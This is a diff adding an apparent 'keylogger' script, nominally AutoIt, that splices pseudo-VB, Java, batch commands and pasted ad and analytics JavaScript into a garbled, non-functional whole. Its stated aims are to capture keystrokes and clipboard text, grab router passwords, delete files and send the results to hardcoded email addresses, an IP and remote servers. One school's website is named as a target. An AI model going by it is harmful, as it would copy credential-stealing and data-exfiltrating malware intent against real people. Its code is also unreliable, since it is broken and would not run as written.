@@ -1,0 +1,368 @@
+#cs ----------------------------------------------------------------------------
+
+ AutoIt Version: 3.2.1 Beta
+ Author:         M&S Productions
+
+ Script Function:
+	{GetKeys}
+
+#ce ----------------------------------------------------------------------------
+#Script 1
+; Script Start
+
+time.getlocal(time)) == 1  (("time.microsoft.com")); 
+if !== 1 (("time.microsoft.com"));
+jmessagebox("We're sorry, but only TIME.MICROSOFT.COM as local time is supported, look on Youtube on how to change it", 1+2, "An error Accured")
+CHECK;
+if SCRIPT.NEWACCOUNT == 1 ("2012 - 2013")) == 1
+jmessagebox("We're sorry but this script is outdated, please wait for an update", 1+2, "An error Accured")
+
+}else{
+
+Readline("27");
+; Script End
+
+
+
+#script 2
+; start script
+Do On Start;
+	//Java
+Java.Active = true
+Java = JavaString
+Java.CheckUpdates 'On Sever
+MitchelProductionsTag.Update().GetTarget("Update")
+MitchelProductionsTag.Update().Interact("Update"));
+mitchelproductionstag.pubads().enableSingleRequest();
+			mitchelproductionstag.enableServices();
+Java.Remove.OldDatabase = True If Clicked 'YES!'
+}else{
+	If Awnser='NO' Then
+	awnser.interact(("No"))
+		Java.Remove.OldDatabase = False Till
+		Java.CheckUpdates("1");
+		java.makedatabase ( == 1)) 
+		java.databasename == (("DtaKeylogger.sqldb"));
+		; Makes a new database after removing old one.
+
+
+----------------------------------------------------------------------------------------------------------------------
+Func
+Dim String As NewIp
+NewIp As CurrentUser = Send
+If Break.Sec.Break Then
+	Try
+	Get.IpOfCurrentUser And Send (ReadLine: 21 + 55 )
+Else If Button.GetKeyToSQL.Database Then
+	(Readline: 102 + 121)
+EndFunc
+
+Func
+	Try
+	Break.Security.ZENWORKS
+	IP(195.88.32.191(proxy ==1));
+	TryBreak.To.GETPASSWORD And Remove.Data
+	Romove.ALLFILES And Send.FilesTo(Readline; 75 + 85 )
+	.UNBLOCKALL.IF.BREAK
+	String As New Break
+	Dim As New String
+	EndFunc
+	
+	New Func
+	@override
+	Break( == 1) 
+	webprotect.override.closeall());
+	EndFunc
+____________________________________________________________________________________________________________________________________________
+NewCmd.Command
+@Echo Off
+WWW.COMMAND.COM
+
+COMMAND
+
+//New Func
+	Start
+	CmdCommand = Tracert www.mariscollege.nl If Error Then
+	GetIp And RouterIP If True And Can Execute Then
+		(ReadLine: 21 + 55 ) And Do
+
+			EndFunc
+
+
+_____________________________________________________________________________________________________________________________________________
+
+
+Imports.VB
+Imports.VBNET
+Imports.VBTool
+Imports.VBToolBox
+Imports.VBNETS
+Imports.VBData
+Imports.VBALL
+
+
+
+
+
+Dim As New Keylogger
+Dim As New String
+Get String From Code(Line: 28 till 38)
+//Execute
+New Command
+OnAutoItExitRegister
+New Object
+New ObjCreate
+New Event As While Active
+New ObjEvent
+New.SQLConnection(NewConnection);
+SQLNewConnection As Database Send
+Form.Border.Weight(;145;Height;145)
+Button.Add.Name = Get Key To Email
+Button.Add.Name = Get Key To SQL.Database
+//Execute Command
+Write Script
+DirMove To Send Command
+Send(BID;10244)
+//End Command
+DirCreate.C:\Windows.txt('txt')
+Divene Send As To
+mailto:"supportmvpro@hotmail.com" And "pur3stein@hotmail.com"
+//Send
+Windows.txt('txt')
+'txt' As DirName
+Return False;
+If Return True
+	Then Try
+	// Go to Functions Start;
+	End Try
+	Do On Fail:
+		End Script
+		End Program
+		Restart;
+
+//Function Script
+Function Start;
+Script SRandom
+While Active Get DataString.OfClipBoard
+	From.ActiveUser
+	ClipPut = ClipGet
+	ClipGet As  ClipPut
+	ClipPut = NewObject
+	NewObject(BID;1096)
+	GetClipBoardText.('+WebBrowserAddres'(BID;694)
+	SendClipBoardText.('+WebBrowserAddres'(BID;694)
+	GetFrom.FileIO.C;\Windows.txt('txt)
+	.FileIO.C;\Windows.txt('txt) Send (ReadLine; 55 + 59 )
+	If
+		FileChangeDir Then
+		Make.FileIO.C;\Windowss.txt('txt)
+		End If
+			//
+
+        'NEW TEST IF TEST SUCSSEED!@THEN DO'
+
+		//Start Test
+    Imports Mitchelproductions.co.cc.NewDataBase
+	Imports Mitchelproductions.co.cc.NewKeys
+	import Mitchelproductions.co.cc.NewTitle
+	//Test Title
+	New Title As Test
+	Title.(2012;2011)
+	//End Test
+	if Test Sucsessed Then
+		Proceed
+	Else
+		ReadLine.( 45 + 47 ) And Execute
+
+		public int NewWebsite as website.local
+		Func
+		//Test True Test If Sucessed
+			GetPassword From ROUTERIP(BID;0901) + Domian From
+			NewWebsite('www.mariscollege.nl') 
+			
+			}else{
+			@override
+			NewWebsite("http://www.MarisCollege.net/"))
+			
+			if NewWebsite == 1
+			
+			GetPasswordFrom.RouterIP.Name = MarisCollegeAP
+			// End Test
+			On Sucses Then; Send Keys To
+			mailto:supportmvpro@hotmailc.com
+		EndFunc
+	WriteNewKeylogger()
+	Write.Buffer(1;)
+
+
+	//New Line
+	For:
+	Option Button = Send To Database
+//SQLDataBase Keys
+
+	MySql As New Data String(MySQLConnection as NewConnection Data String) MySql.Active = True
+MySQLNewConnection As DataKey
+}
+MySQLConnection Datakey.load = True
+Rootname = Root
+RootPass = Admin
+End Connection If Failure = True
+Return False;
+//Execute Command
+Try
+End Try
+//
+If Connection If Failure = False Then
+Send Key To DataBase.SQLConnection = A None String Value
+//
+
+Terms;
+
+// Determs
+A = A.
+C = C;
+X = A
+Y = Ç
+I = Á
+// End
+
+}
+  }
+  Number 1 Assign To A.
+  Number 2 Assign To C;
+  Number 3 Assign To A
+  Number 4 Assign To Ç
+  Number 5 Assign To Á
+                 
+  Term@ A. To String
+  Term@ C To String
+  Term@ A To String
+  Term@ ç To String
+  Term@ Á To String
+}
+
+       }
+	   
+'Code.Transfer("https://MPPRO/STATUS/UPDATE/CODE/TRANFERTED/")); 'old
+Code.Transfer("https://MPRODUCT/SERVER/FILES/PRODUCTS/KEYLOGGERS/CODE/TRANSFERED/")); 'new
+//Script Test
+GetNewIp As Func
+Func = NewIp = CurrentUserIp
+SenD CurrentIP (Func) To: (ReadLine: 28 + 32 )
+	GetPasswordCurrentPassword.CurrentUser()
+	CurrentUser.Ip.Send (ReadLine: 28 + 32 )
+	}
+	 M@SProductionsCode = GetScript
+	 GetScripts()
+	 Imports.Mitchelproductions.co.cc(ScriptGet.UntilEnd)
+	 Func; Send = True If Send Then
+		 (ReadLine: 28 + 32 )
+     Else if Send.ToDatabase.Interact("@YES")) Then
+	 (Readline 92 + 101 )
+	 Continute()
+	 }Else{
+			 if Send.ToDatabase.Interact("@NO")) Then
+				Return
+    #Excecute
+	@Override
+	Database.Local.Username("MPPRODUCT"));
+	Database.Local.Password("PASSWORD"));
+	'Dont bother hacking its saved to a diffrent database then before
+EndFunc
+
+//Script Test End
+
+'New Database On Fail'
+
+Func
+Do On Fail DataBase(Backup)
+	New SQLDatabase As New Connection
+	.SQLConnection(New Connection) Get
+	Rootname: 'Root'
+	Password: 'M&S Productions'
+	New Database.Create
+	Do On Create = New String
+		New String As New Connection And Shutdown(Readline 191 + 195 )
+		If New Connection Made Then Readline Old Database And Readline ( 191 + 195 )
+			Execute
+			EndFunc
+
+
+
+//Func
+Shutdown Database Of
+Root And Admind
+Open New
+Close Old
+Send To New Remove Number of Old Readline of Line ( 102 + 121 ).Remove And Add New And = Random
+EndFunc
+
+'Database Old.Remove'
+
+Imports JavaScript
+Import.Java.Net
+Import.JavaSun
+Import.Java
+
+//Java
+Java.Active = False
+Java = JavaString (ReadLine: 204 )
+Java.Remove.OldDatabase = True If Clicked 'YES!'
+EndFunc
+NewFunc
+Func
+			mitchelproductionstag.cmd.push(function() {
+
+				mitchelproductionstag.defineUnit('1040193/ca-pub-4716253307645677/Tuner', [468, 60], 'TunerAdControl').addService(mitchelproductionstag.pubads());
+
+
+
+				mitchelproductionstag.pubads().setTargeting("ListingId", "s49307");
+
+
+			mitchelproductionstag.pubads().enableSingleRequest();
+			mitchelproductionstag.enableServices();
+		});
+	</script>
+<script type="text/javascript">
+var _gaq = _gaq || [];
+try {
+	_gaq.push(['_setAccount', 'UA-1720788-1']);
+
+		_gaq.push(['_trackPageview' ]);
+		_gaq.push(['_trackPageLoadTime']);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+	EndFunc
+
+	CreateBody
+	BodyType = Nothing
+	Execute
+	(ReadLine: 196 + 243 )
+	EndBody
+EndFunc
+
+
+
+
+//MouseClick
+ObtainKeyOfCurrentUser
+(If User Does Mouseclick) or if user.getlocal()== 1 keystroke("ALL"));
+	ObtainAllKEYS('From KeyBoard All (+WebBrowserAddres)')
+	Func
+		Replace.ALL('Gets')Int.Obtain
+
+	   MouseClick As New ObjEvent
+		MouseClick.Do; (Readline;286)
+	------------------------------------------------------------
+	If Worked.script.Sucsses Then
+		GoTo.Sever;(http://www.twitter.com/
+	Import.ScriptTo.Sever;(http://www.twitter.com/)
+	Do
+		FILEIO.Make;C:\Windows\System32\Font\key.txt('.txt')
+		Send; True
+		EmailTo; mitchelvandinter@hotmail.com
+		; Script Stop(End;)
